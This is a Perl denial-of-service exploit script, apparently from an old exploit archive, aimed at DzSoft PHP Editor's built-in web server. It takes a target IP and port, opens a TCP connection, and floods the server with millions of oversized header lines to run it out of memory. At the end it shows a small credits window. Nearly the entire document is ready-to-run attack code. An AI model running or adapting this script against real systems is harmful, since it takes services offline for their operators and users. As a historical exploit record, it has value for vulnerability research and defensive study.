#!/usr/bin/perl
#
#    DzSoft PHP Server DOS Exploit
# ------------------------------------
#  Infam0us Gr0up - Securiti Research
# 
#
# Tested on Windows2000 SP4 (Win NT)
# Info: infamous.2hell.com
#

$subject = "DzSoft PHP Server DOS Exploit";
$vers = "DzSoft PHP Editor  3.1.2.8";
$vendor = "http://www.dzsoft.com";
$codz = "basher13 - basher13(at)linuxmail.org";

$ARGC=@ARGV;
if ($ARGC !=2) {
    print "\n";
    print "   $subject\n";
    print "------------------------------------\n\n";
    print "Usage: $0 [remote IP] [port]\n";
    print "Exam: $0 127.0.0.1 80\n";
    exit;
}

use IO::Socket::INET;
use Tk;

$host=$ARGV[0];
$port=$ARGV[1];

print "\n";
print "-------------------------------------------------------\n";
print "[?] Version: libwww-perl-$LWP::VERSION\n";
print "[+] Connect to $host..\n";
$sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port, Proto => 'tcp') 
|| die "[-] Connection error$@\n";

print "[+] Connected\n";
print "[+] Bindmode for socket..\n";
sleep(1);
binmode($sock);

print "[+] Build buffer..\n";
$hostname="Host: $host";
$bufy='A'x50;
$bufa='A'x8183;
$len=length($bufy);
$buff="GET / HTTP/1.1\r\n";
sleep(1);

print "[+] Now kill the process..wait\n";
send($sock,$buff,0) || die "[-] send error:$@\n";
print "[+] Sending buffer..\n";
for($i= 0; $i < 2000000; $i++)
{
    $buff=" $bufa\r\n";
    send($sock,$buff,0) || die "[*] send error:$@, Check if server D0s'ed\n";
}
$buff="$hostname\r\n";
$buff.="Content-Length: $len\r\n";

$buff.="\r\n";
$buff.=$bufy."\r\n\r\n";

send($sock,$buff,0) || die "[-] send error:$@\n";
print "[+] Server Out of Memory\n";
close($sock);
print "-------------------------------------------------------\n";
my $mw = MainWindow->new(-title => 'INFO',);
    my $var;

    my $opt = $mw->Optionmenu(
                
                -options => [qw()],
                -command => sub { print "\n[>]: ", shift, "\n" },
                -variable => \$var,
                )->pack;
    $opt->addOptions([- Subject=>$subject],[- Version=>$vers],[- Vendor=>$vendor],[- Coder=>$codz]);   
    $mw->Button(-text=>'CLOSE', -command=>sub{$mw->destroy})->pack;
    MainLoop;

# milw0rm.com [2005-07-15]
